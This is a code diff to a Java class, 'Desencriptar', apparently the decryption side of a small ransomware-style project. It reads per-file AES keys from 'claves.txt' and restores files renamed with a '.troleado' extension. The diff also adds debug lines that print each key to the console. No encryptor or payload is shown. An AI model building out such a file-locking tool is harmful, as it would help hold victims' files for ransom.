@@ -7,7 +7,8 @@ import java.util.Arrays;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 
 
 public class Desencriptar {
@@ -30,19 +31,56 @@ public class Desencriptar {
 		return ret;
 	}
 
-	private static String leeKey(String fichero){
-		return "AAAAAAAAAAAAAAAA";
+	private static String leeKey(String fichero, int indice) {
+
+		FileReader archivo = null;
+		BufferedReader lectura = null;
+		String linea = null;
+		int contador = 0;
+
+		try {
+
+			archivo = new FileReader("claves.txt");
+			lectura = new BufferedReader(archivo);
+
+			linea = lectura.readLine();
+			contador++;
+
+			while(contador <= indice) {
+
+				linea = lectura.readLine();
+				contador++;
+			}
+
+			System.out.println(linea);
+			
+			//linea = decode(linea);
+			//linea = new String(Base64.getDecoder().decode(linea, StandardCharsets.UTF_8.name()));
+
+			for(int i=0; i<linea.length(); i++) {
+
+				System.out.println("caracter -- " + linea.charAt(i) + " pesa: " + (byte)linea.charAt(i));
+			}
+
+			System.out.println(linea);
+			
+		} catch(IOException e) {
+
+			System.out.print(System.lineSeparator() + "ERROR: " + e.getMessage());
+		}
+
+		return linea;
 	}
 
 
-	private static void DescifraFichero(String fichero){
+	private static void DescifraFichero(String fichero, int indice){
 		String cifradoNombre = fichero.split("\\.")[0];
 		cifradoNombre+=".troleado";
 		File outpt = new File(fichero);
 		File inpt = new File(cifradoNombre);
 		
 		//falta leer y descifrar key
-		String key=leeKey(fichero);
+		String key=leeKey(fichero, indice);
 		//aqui se haria la encriptacion
 		try{
 			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
@@ -64,9 +102,9 @@ public class Desencriptar {
 			outputStream.write(outputBytes);
 			inputStream.close();
 			outputStream.close();
-			System.out.print(System.lineSeparator() + "EXITO AL DESCIFRAR! : DESCIFRADO: " + fichero);
+			System.out.println(System.lineSeparator() + "EXITO AL DESCIFRAR! : DESCIFRADO: " + fichero);
 		}catch(Exception e){
-			System.out.print(System.lineSeparator() + "ERROR DESENCRIPTAR : " + e.getMessage() + " ----- NO SE PUDO DESENCRIPTAR " + fichero);
+			System.out.println(System.lineSeparator() + "ERROR DESENCRIPTAR : " + e.getMessage() + " ----- NO SE PUDO DESENCRIPTAR " + fichero);
 		}
 	}
 
@@ -75,8 +113,22 @@ public class Desencriptar {
 		ArrayList<String> ficheros = leeFicheros();
 		//System.out.println(ficheros.toString());
 		for(int i = 0;i<ficheros.size();i++){
-			DescifraFichero(ficheros.get(i));
+
+			DescifraFichero(ficheros.get(i), i);
 		}
 	}
 
+
+	public static String decode(String value) {
+
+		try {
+			byte[] decodedValue = Base64.getDecoder().decode(value);  // Basic Base64 decoding
+			return new String(decodedValue, StandardCharsets.UTF_8);
+
+		} catch (Exception e) {
+
+			System.out.println("Error: " + e.toString());
+			return null;
+		}
+	 }
 }
